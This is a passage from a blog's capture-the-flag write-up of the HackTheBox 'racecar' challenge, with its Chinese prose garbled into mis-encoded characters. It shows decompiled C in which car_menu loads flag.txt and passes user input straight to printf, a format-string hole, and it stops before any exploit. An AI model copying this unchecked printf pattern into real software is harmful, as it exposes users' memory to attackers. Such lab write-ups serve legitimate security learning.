<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HackTheBox racecar --WP | ã¿ã‚„ã¯ã— ã‚Šã‚‡ã† çš„ Reality marble</title><meta name="author" content="ã¿ã‚„ã¯ã— ã‚Šã‚‡ã†"><meta name="copyright" content="ã¿ã‚„ã¯ã— ã‚Šã‚‡ã†"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="é¢˜ç›®æ¦‚æ‹¬ï¼šè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹HackTheBoxä¸Šæœ€ç®€å•çš„ä¸€é“PWNé¢˜ã€‚ 123456789101112131415161718192021222324ğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒ      ______                                       |xxx|     &#x2F;|_||_\&#96;.">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox racecar --WP">
<meta property="og:url" content="http://example.com/yui/4f65e8bd.html">
<meta property="og:site_name" content="ã¿ã‚„ã¯ã— ã‚Šã‚‡ã† çš„ Reality marble">
<meta property="og:description" content="é¢˜ç›®æ¦‚æ‹¬ï¼šè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹HackTheBoxä¸Šæœ€ç®€å•çš„ä¸€é“PWNé¢˜ã€‚ 123456789101112131415161718192021222324ğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒ      ______                                       |xxx|     &#x2F;|_||_\&#96;.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/daliy.jpg">
<meta property="article:published_time" content="2022-12-05T16:58:17.000Z">
<meta property="article:modified_time" content="2022-12-06T08:32:48.693Z">
<meta property="article:author" content="ã¿ã‚„ã¯ã— ã‚Šã‚‡ã†">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/daliy.jpg"><link rel="shortcut icon" href="/img/qigong.jpg"><link rel="canonical" href="http://example.com/yui/4f65e8bd"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HackTheBox racecar --WP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-12-06 16:32:48'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/qigong.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/daliy.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ã¿ã‚„ã¯ã— ã‚Šã‚‡ã† çš„ Reality marble</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HackTheBox racecar --WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2022-12-05T16:58:17.000Z" title="å‘è¡¨äº 2022-12-06 00:58:17">2022-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2022-12-06T08:32:48.693Z" title="æ›´æ–°äº 2022-12-06 16:32:48">2022-12-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HackTheBox racecar --WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="é¢˜ç›®æ¦‚æ‹¬ï¼š"><a href="#é¢˜ç›®æ¦‚æ‹¬ï¼š" class="headerlink" title="é¢˜ç›®æ¦‚æ‹¬ï¼š"></a>é¢˜ç›®æ¦‚æ‹¬ï¼š</h2><p>è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹HackTheBoxä¸Šæœ€ç®€å•çš„ä¸€é“PWNé¢˜ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒ</span><br><span class="line">      ______                                       |xxx|</span><br><span class="line">     /|_||_\`.__                                   | F |                     </span><br><span class="line">    (   _    _ _\                                  |xxx|                     </span><br><span class="line">*** =`-(_)--(_)-<span class="string">&#x27;                                  | I |                     </span></span><br><span class="line"><span class="string">                                                   |xxx|                     </span></span><br><span class="line"><span class="string">                                                   | N |                     </span></span><br><span class="line"><span class="string">                                                   |xxx|                     </span></span><br><span class="line"><span class="string">                                                   | I |                     </span></span><br><span class="line"><span class="string">                                                   |xxx|                     </span></span><br><span class="line"><span class="string">             _-_-  _/\______\__                    | S |                     </span></span><br><span class="line"><span class="string">           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                     </span></span><br><span class="line"><span class="string">            _-_- `( o )----( o )-&#x27;</span>                 | H |                     </span><br><span class="line">                   `-<span class="string">&#x27;      `-&#x27;</span>                    |xxx|                     </span><br><span class="line">ğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒ                     </span><br><span class="line">                                                                             </span><br><span class="line">Insert your data:                                                            </span><br><span class="line">                                                                             </span><br><span class="line">Name: yui                                                                    </span><br><span class="line">Nickname: mio                                                                </span><br><span class="line">                                                                             </span><br><span class="line">[+] Welcome [yui]!                                                           </span><br><span class="line">                                                                             </span><br><span class="line">[*] Your name is [yui] but everybody calls you.. [mio]!   </span><br></pre></td></tr></table></figure>
<h2 id="å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æ"><a href="#å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æ" class="headerlink" title="å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æ"></a>å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æ</h2><p>ä¸‹è½½åè§£å‹ï¼Œåªæœ‰ä¸€ä¸ªELFæ–‡ä»¶ï¼Œå¯¹æ–‡ä»¶è¿›è¡Œåˆ†æï¼Œè¿™æ˜¯32-bitçš„ELFæ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file racecar         </span><br><span class="line">racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped</span><br></pre></td></tr></table></figure>
<h3 id="è¿è¡Œæ–‡ä»¶"><a href="#è¿è¡Œæ–‡ä»¶" class="headerlink" title="è¿è¡Œæ–‡ä»¶"></a>è¿è¡Œæ–‡ä»¶</h3><p>åœ¨ç»å†ä¸€ç³»åˆ—é€‰æ‹©åï¼Œæˆ‘ä»¬ä¼šè·å¾—æ¸¸æˆçš„èƒœåˆ©ï¼Œç„¶åæœ‰ä¸€ä¸ªå‘è¨€çš„æœºä¼šï¼Œç¨‹åºä¼šæŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] Waiting <span class="keyword">for</span> the race to finish...                                        </span><br><span class="line">                                                                             </span><br><span class="line">[+] You won the race!! You get 100 coins!                                    </span><br><span class="line">[+] Current coins: [169]                                                     </span><br><span class="line">                                                                             </span><br><span class="line">[!] Do you have anything to say to the press after your big victory?         </span><br><span class="line">&gt; I AM CHAMPION!                                                             </span><br><span class="line"></span><br><span class="line">The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: </span><br><span class="line">I AM CHAMPION!</span><br></pre></td></tr></table></figure>
<h3 id="IDAåç¼–è¯‘åˆ†æ"><a href="#IDAåç¼–è¯‘åˆ†æ" class="headerlink" title="IDAåç¼–è¯‘åˆ†æ"></a>IDAåç¼–è¯‘åˆ†æ</h3><p>å› ä¸ºæ˜¯32-bitçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬æ”¾åˆ°IDA32-bitçš„ç¯å¢ƒä¸‹åˆ†æï¼Œè®©æˆ‘ä»¬å…ˆçœ‹ä¸»å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setup();</span><br><span class="line">  banner();</span><br><span class="line">  info();</span><br><span class="line">  <span class="keyword">while</span> ( check )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = menu();</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      car_info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      check = <span class="number">0</span>;</span><br><span class="line">      car_menu();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%s[-] Invalid choice!%s\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¥½å§å¥½åƒæ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ã€‚<br>è®©æˆ‘ä»¬æ¥ç€çœ‹å‡½æ•°car_info</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">car_info</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(asc_1BB0);</span><br><span class="line">  <span class="built_in">puts</span>(aCar1Stats);</span><br><span class="line">  <span class="built_in">printf</span>(aSpeedS, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;33m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(aAccelerationS, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;33m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(aHandlingS, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;33m&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_1BB0);</span><br><span class="line">  <span class="built_in">puts</span>(aCar2Stats);</span><br><span class="line">  <span class="built_in">printf</span>(aSpeedS_0, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;33m&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(aAccelerationS_0, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;33m&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(aHandlingS_0, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_1BB0);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªcar_infoå‡½æ•°ä¾æ—§æ²¡ä»€ä¹ˆç”¨<br>car_menuã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">car_menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+0h] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+8h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+10h] [ebp-48h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">44</span>]; <span class="comment">// [esp+20h] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  v6 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(aSelectCar1);</span><br><span class="line">    v9 = read_int(v4, v6);</span><br><span class="line">    <span class="keyword">if</span> ( v9 != <span class="number">2</span> &amp;&amp; v9 != <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n%s[-] Invalid choice!%s\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v9 != <span class="number">2</span> &amp;&amp; v9 != <span class="number">1</span> );</span><br><span class="line">  v10 = race_type();</span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">1</span> &amp;&amp; v10 == <span class="number">2</span> || v9 == <span class="number">2</span> &amp;&amp; v10 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = rand() % <span class="number">10</span>;</span><br><span class="line">    v7 = rand() % <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == <span class="number">1</span> &amp;&amp; v10 == <span class="number">1</span> || v9 == <span class="number">2</span> &amp;&amp; v10 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = rand() % <span class="number">100</span>;</span><br><span class="line">    v7 = rand() % <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = rand() % <span class="number">100</span>;</span><br><span class="line">    v7 = rand() % <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="built_in">strlen</span>(<span class="string">&quot;\n[*] Waiting for the race to finish...&quot;</span>); ; i = <span class="built_in">strlen</span>(<span class="string">&quot;\n[*] Waiting for the race to finish...&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = i;</span><br><span class="line">    result = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= v8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(aWaitingForTheR[v8]);</span><br><span class="line">    <span class="keyword">if</span> ( aWaitingForTheR[v8] == <span class="number">46</span> )</span><br><span class="line">      sleep(<span class="number">0</span>);</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">1</span> &amp;&amp; (result = v5, v5 &lt; v7) || v9 == <span class="number">2</span> &amp;&amp; (result = v5, v5 &gt; v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>);</span><br><span class="line">    coins += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, coins, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>, <span class="string">&quot;\x1B[0m&quot;</span>);</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x171</span>u);</span><br><span class="line">    stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">105</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fgets(v13, <span class="number">44</span>, stream);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x170</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&quot;</span>);</span><br><span class="line">    result = <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == <span class="number">1</span> &amp;&amp; (result = v5, v5 &gt; v7) || v9 == <span class="number">2</span> &amp;&amp; (result = v5, v5 &lt; v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[-] You lost the race and all your coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    coins = <span class="number">0</span>;</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, <span class="number">0</span>, <span class="string">&quot;\x1B[1;36m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°car_menuåŒ…å«äº†è¿™ä¸ªç¨‹åºçš„å¤§éƒ¨åˆ†é€»è¾‘ï¼›è¿™ä¸ªç¨‹åºå°±æ˜¯æˆ‘ä»¬åœ¨è¾“å…¥åå­—åå¼€å§‹èµ›è½¦ï¼Œç„¶åè¾“å…¥2ï¼Œ2ï¼Œ1å°±å¯ä»¥èµ¢å¾—æ¯”èµ›ã€‚ç„¶åæˆ‘ä»¬ä¼šè·å¾—æ„Ÿæƒ³ä»€ä¹ˆçš„ã€‚æˆ‘ä»¬è¾“å…¥ä¸€äº›coinsï¼Œå®ƒå†æ‰“å°å‡ºæ¥ã€‚</p>
<p>è®©æˆ‘ä»¬æ³¨æ„ä¸‹è¿™æ®µ</p>
